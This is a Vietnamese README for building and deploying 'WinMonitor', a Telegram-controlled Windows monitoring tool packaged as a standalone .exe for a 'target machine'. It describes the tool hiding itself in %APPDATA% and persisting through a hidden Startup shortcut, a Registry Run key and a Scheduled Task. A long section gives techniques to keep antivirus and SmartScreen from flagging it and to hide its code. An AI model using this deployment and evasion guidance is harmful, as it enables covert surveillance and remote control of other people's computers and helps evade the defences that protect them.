# tool_build — Đóng gói thành `WinMonitor.exe` (máy đích KHÔNG cần Python)

## Vì sao cần?

`win_monitor.pyw` / `win_monitor_mahoa.pyw` đều **cần Python** trên máy chạy. Nếu máy
đích chưa cài Python thì script không chạy được. Giải pháp: đóng gói thành **1 file
`WinMonitor.exe` độc lập** — Python và mọi thứ được nhúng sẵn bên trong.

---

## Cách 1 (KHUYẾN NGHỊ): Build tự động bằng GitHub Actions

Không cần máy Windows. Repo đã có sẵn workflow `.github/workflows/build-windows-exe.yml`.

1. Push code lên nhánh `main` (hoặc vào tab **Actions → Build Windows EXE → Run workflow**).
2. Đợi ~2 phút, vào **Actions → lần chạy mới nhất → mục Artifacts**, tải
   **`WinMonitor-windows-exe`** → trong đó có `WinMonitor.exe`.
3. (Tùy chọn) Tạo tag `v1.0.0` để tự gắn `.exe` vào **Releases**:
   ```bash
   git tag v1.0.0 && git push origin v1.0.0
   ```

---

## Cách 2: Build trên máy Windows của bạn

```bat
pip install -r tool_build/requirements.txt
python tool_build/build_exe.py
:: -> dist\WinMonitor.exe
```

Tùy chọn:
- `--onedir` : xuất ra thư mục (khởi động nhanh hơn, nhưng nhiều file)
- `--name TenKhac` : đổi tên file .exe
- Đặt file `tool_build/icon.ico` để có icon riêng.

---

## Triển khai trên máy đích (không cần Python)

1. Copy **`WinMonitor.exe`** sang máy đích.
2. Cấu hình token/chat id theo 1 trong 3 cách:
   - **a)** Chạy 1 lần: `WinMonitor.exe --token 123:ABC --chat 987654321`
   - **b)** Đặt file `winmonitor.config.json` **cạnh file .exe** (xem
     `winmonitor.config.example.json`) → tự nạp khi chạy lần đầu.
   - **c)** Dùng file cấu hình bất kỳ: `WinMonitor.exe --config C:\duong\dan.json`
3. Double-click `WinMonitor.exe`. Lần đầu chạy nó sẽ:
   - Tự copy `.exe` vào `%APPDATA%\WinMonitor\WinMonitor.exe` (ẩn)
   - Tạo shortcut ẩn trong Startup + đăng ký Registry Run + Scheduled Task
     (tự khởi động & tự phục hồi)
4. Mở Telegram, nhắn `/start`.

> Máy đích **không cần cài Python**. Chỉ cần chép file `.exe` và chạy.

---

## Lưu ý

- File `.exe` do PyInstaller tạo ra **lớn hơn** (~8–12MB) và một số phần mềm diệt
  virus có thể báo nhầm (false positive) với file PyInstaller — đây là hiện tượng
  phổ biến; có thể ký số (code signing) để giảm cảnh báo.
- Bản `.exe` **không cần** mật khẩu giải mã (vì code đã được biên dịch/nhúng sẵn),
  nhưng **vẫn giữ nguyên** toàn bộ tính năng + cơ chế OTP qua Telegram.
- Nếu muốn vừa "không cần Python" vừa "giấu code": dùng `.exe` là đủ (PyInstaller
  không để lộ source rõ ràng như `.pyw`).
- File `winmonitor.config.json` chứa token → đã nằm trong `.gitignore`, đừng commit.

---

## 🛡️ Chống báo nhầm Antivirus (false positive)

File `.exe` do PyInstaller tạo **rất hay bị AV báo nhầm** (vì PyInstaller đóng gói
Python + giải nén ra thư mục tạm khi chạy — giống hành vi của malware packer). Đây là
vấn đề phổ biến, có nhiều cách giảm/khắc phục. Áp dụng **càng nhiều lớp càng tốt**:

### 1. Tắt UPX (đã bật mặc định trong build_exe.py)
UPX nén file → là nguyên nhân số 1 bị báo nhầm. Script build đã thêm `--noupx`.
**Không** tự bật UPX.

### 2. Build dạng `--onedir` (KHUYẾN NGHỊ nếu vẫn bị báo)
```bat
python tool_build/build_exe.py --onedir
```
Bản `onedir` (thư mục nhiều file) **ít bị AV báo nhầm hơn nhiều** so với `--onefile`,
vì không giải nén ra `%TEMP%` mỗi lần chạy. Workflow CI đã build sẵn cả hai bản:
`WinMonitor-onefile.exe` và `WinMonitor-onedir.zip`.

### 3. Ký số (Code Signing) — CÁCH HIỆU QUẢ NHẤT
Ký file `.exe` bằng chứng chỉ code-signing giúp Windows SmartScreen + AV tin cậy hơn
hẳn. Có 2 lựa chọn:
- **Chứng chỉ EV / OV** (mua từ DigiCert, Sectigo, SSL.com...): uy tín cao nhất,
  hết cảnh báo SmartScreen ngay. Tốn phí (~$200–400/năm).
- **Chứng chỉ tự ký (self-signed)**: miễn phí nhưng máy đích phải cài cert vào
  "Trusted Root" thì mới hết cảnh báo.

Build + ký bằng file `.pfx`:
```bat
python tool_build/build_exe.py --sign "C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\signtool.exe" --pfx mycert.pfx --pfx-pass MatKhau
```

Trong GitHub Actions, chỉ cần thêm 2 **Secrets**: `CODE_SIGN_PFX_BASE64` (nội dung
file .pfx mã base64) và `CODE_SIGN_PFX_PASSWORD` → workflow tự ký.

Tạo base64 từ .pfx (PowerShell):
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("mycert.pfx")) | Set-Clipboard
```

### 4. Manifest + Version resource (đã bật mặc định)
`tool_build/manifest.xml` và `tool_build/version_info.txt` giúp `.exe` có metadata
đầy đủ (tên, phiên bản, nhà phát hành, tương thích Win) → "trông chính danh" hơn.

### 5. Dùng Python 3.12 (đã cấu hình trong CI)
Một số bản Python mới (3.13) có bootloader bị AV để ý hơn. CI đang dùng 3.12 ổn định.

### 6. Gửi mẫu báo nhầm (false positive report) — miễn phí
Nếu vẫn bị báo, gửi file `.exe` cho hãng AV để họ gỡ khỏi danh sách:
- **Microsoft**: https://www.microsoft.com/en-us/wdsi/filesubmission
- **Kaspersky**: https://opentip.kaspersky.com/ → "Report a false detection"
- **Bitdefender / Avast / Norton**: trang submit mẫu tương tự.

Thường sau 1–3 ngày họ cập nhật và hết báo. Đây là cách phổ biến các tool mã nguồn mở
vẫn làm.

### 7. Thêm loại trừ (Exclusion) trên máy đích
Nếu bạn kiểm soát máy đích: thêm `%APPDATA%\WinMonitor\` và file `.exe` vào
**Windows Security → Virus & threat protection → Exclusions**. (Chỉ làm khi bạn
tin tưởng file — vì đây là máy của chính bạn.)

### 8. Đóng gói bằng Nuitka (thay PyInstaller) — nâng cao
Nếu cần "sạch" tối đa: dùng **Nuitka** (`--standalone`) biên dịch Python thành C rồi
ra `.exe`. File kết quả **ít bị AV báo nhầm hơn nhiều** so với PyInstaller (không
giải nén ra temp). Đổi lại: build lâu hơn và cần trình biên dịch C trên máy build
(CI `windows-latest` đã có sẵn MSVC). Có thể thêm sau nếu cần.

---

### Tóm lại thứ tự ưu tiên nếu bị báo nhầm
1. Build **`--onedir`** (nhanh, hiệu quả, miễn phí) — dùng bản `WinMonitor-onedir.zip`.
2. **Ký số** bằng chứng chỉ (hiệu quả nhất, hết SmartScreen).
3. **Gửi false-positive report** cho hãng AV (miễn phí, 1–3 ngày).
4. Thêm **exclusion** trên máy đích (nếu bạn quản lý máy).
5. Cân nhắc **Nuitka** nếu cần sạch tối đa.
